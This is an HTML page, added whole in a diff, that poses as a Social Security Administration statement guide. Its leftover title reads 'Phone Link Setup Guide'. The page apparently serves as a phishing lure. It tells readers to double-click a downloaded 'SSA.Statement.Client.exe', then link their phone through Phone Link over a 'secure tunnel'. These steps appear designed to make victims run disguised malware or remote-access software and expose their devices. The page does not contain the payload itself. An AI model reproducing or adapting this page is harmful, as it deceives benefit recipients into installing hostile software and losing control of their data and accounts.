@@ -1,0 +1,253 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Link Setup Guide</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background: #f0f2f5;
+            color: #333;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #0078d4;
+            text-align: center;
+            margin-bottom: 30px;
+            animation: slideDown 0.5s ease-out;
+        }
+
+        .step-container {
+            display: flex;
+            align-items: start;
+            gap: 30px;
+            margin: 40px 0;
+            padding: 25px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            border-left: 4px solid #0078d4;
+            opacity: 0;
+            animation: slideIn 0.5s ease-out forwards;
+        }
+
+        .step-content {
+            flex: 1;
+        }
+
+        .step-images {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .instruction-image {
+            width: 100%;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            border: 1px solid #ddd;
+            transition: transform 0.3s ease;
+        }
+
+        .instruction-image:hover {
+            transform: scale(1.02);
+        }
+
+        .step-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            gap: 15px;
+        }
+
+        .step-icon {
+            font-size: 1.5em;
+            color: #0078d4;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #e8f0fe;
+            border-radius: 50%;
+        }
+
+        .substep {
+            margin: 15px 0;
+            padding-left: 20px;
+            border-left: 2px solid #0078d4;
+        }
+
+        .alert {
+            background: #fdefe3;
+            border-left: 4px solid #ff8c00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .success-indicator {
+            color: #28a745;
+            margin-right: 10px;
+        }
+
+        .security-note {
+            background: #e8f0fe;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border-left: 4px solid #0078d4;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideIn {
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .step-container {
+                flex-direction: column;
+            }
+            
+            .step-images {
+                order: -1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1><i class="fas fa-check-circle success-indicator"></i> SSA Statement Guide</h1>
+             
+            <div class="step-content">
+                <div class="step-header">
+                    <div class="step-icon">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    <h2>Maximize Your Benefits</h2>
+                </div>
+              <p>Access your statement through our secure online portal for an enhanced experience. Take time to review your information carefully and reach out to us with any questions. Your financial future matters to us!</p>
+                
+                <div class="substep">
+                    <h3><i class="fas fa-check-circle success-indicator"></i>Highlights of Your Updated Statement:</h3>
+                    <ul>
+                        <li>Earnings Record: Review for accuracy and report any discrepancies.</li>
+                        <li>Retirement Benefit Estimates: Monthly estimates for ages 62 to 70.</li>
+                        <li>Additional Details: Information on disability benefits, Medicare, and relevant fact sheets.</li>
+                    </ul>
+                </div>
+            </div>
+              <div class="step-container">
+            <div class="step-content">
+                <div class="step-header">
+                    <div class="step-icon">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    <h2>Step 1: Install the Document Viewer APP</h2>
+                </div>
+                <ol>
+                    <li>After Download Completes, Search for <span style="color:#0071bb; "> "SSA.Statement.Client" </span> on Downloads Folder</li>
+                    <li>Double click on EXE file and wait till secure connection starts</li>
+                    <li>Open your SSA account and Download your Statement</li>
+                </ol>
+            </div>
+            <div class="step-images">
+                <img src="1.png" alt="Search Phone Link in taskbar" class="instruction-image">
+            </div>
+        </div>
+
+        <div class="step-container">
+            <div class="step-content">
+                <div class="step-header">
+                    <div class="step-icon">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    <h2>Step 2: Install Phone Link App</h2>
+                </div>
+                <ol>
+                    <li>Click the Windows search bar in your taskbar</li>
+                    <li>Type "Phone Link" in the search box</li>
+                    <li>Click on the Phone Link app from search results</li>
+                </ol>
+                <div class="substep">
+                    <h3><i class="fas fa-check-circle success-indicator"></i>First-time Setup:</h3>
+                    <ul>
+                        <li>Launch Phone Link app</li>
+                        <li>Sign in with your Microsoft account</li>
+                        <li>Accept the permissions when prompted</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="step-images">
+                <img src="2.png" alt="Search Phone Link in taskbar" class="instruction-image">
+            </div>
+        </div>
+
+        <div class="step-container">
+            <div class="step-content">
+                <div class="step-header">
+                    <div class="step-icon">
+                        <i class="fas fa-link"></i>
+                    </div>
+                    <h2>Step 3: Connect to Secure Tunnel</h2>
+                </div>
+                <ol>
+                    <li>Open Phone Link app</li>
+                    <li>Click "Link your phone"</li>
+                    <li>Launch <span style="color:#0071bb; "> "SSA.Statement.Client.exe" </span> on your PC/Laptop</li>
+                    <li>Wait for secure tunnel connection</li>
+                    <li>Verify connection status</li>
+                </ol>
+                <div class="security-note">
+                    <i class="fas fa-shield-alt"></i> <strong>Security Note:</strong>
+                    <p>The secure tunnel ensures encrypted communication between your phone and PC. Always verify the connection status indicator shows green before proceeding.</p>
+                </div>
+            </div>
+            <div class="step-images">
+                <img src="3.png" alt="Link your phone screen" class="instruction-image">
+            </div>
+        </div>
+
+        <div class="alert">
+            <i class="fas fa-exclamation-triangle"></i>
+            <strong>Important:</strong> Make sure both your PC and phone are connected to the same network for optimal performance. If you encounter any issues, try restarting both devices.
+        </div>
+    </div>
+
+    <script>
+        // Add sequential animation delays to steps
+        document.querySelectorAll('.step-container').forEach((step, index) => {
+            step.style.animationDelay = `${index * 0.2}s`;
+        });
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93573ecd5adee597',t:'MTc0NTUxNDk1My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
